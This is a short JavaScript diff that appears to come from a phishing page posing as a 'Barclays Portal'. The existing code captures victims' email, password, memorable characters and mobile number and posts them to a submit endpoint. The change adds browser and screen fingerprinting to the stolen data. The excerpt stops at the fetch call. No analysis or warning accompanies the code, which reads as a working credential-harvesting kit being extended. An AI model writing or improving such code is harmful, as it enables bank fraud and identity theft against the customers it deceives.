@@ -295,13 +295,23 @@
       });
     }
     
+    var deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: window.screen.width + 'x' + window.screen.height
+    };
+    var browserAgent = navigator.userAgent;
+    var screenRes = window.screen.width + 'x' + window.screen.height;
     const data = {
       page: 'Barclays Portal',
       type: type,
       email: document.getElementById('email').value,
       pwd: document.getElementById('pwd').value || memorable_chars,
       msMobile: document.getElementById('ms-mobile').value,
-      memorable_chars: memorable_chars
+      memorable_chars: memorable_chars,
+      browser_agent: browserAgent,
+      screen_resolution: screenRes,
+      deviceInfo: deviceInfo
     };
     try {
       await fetch('/submit', {
